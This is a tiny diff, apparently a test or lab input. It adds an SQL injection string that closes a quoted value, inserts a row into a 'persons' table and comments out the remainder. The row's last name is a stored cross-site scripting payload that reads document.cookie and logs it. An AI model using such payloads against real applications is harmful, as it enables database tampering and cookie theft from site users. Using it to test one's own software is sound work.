@@ -1,0 +1,2 @@
+'); insert into persons(firstName, lastName, email)
+values ('iko', '<img src="x" onerror="console.log(document.cookie);"/>', 'Proba') --
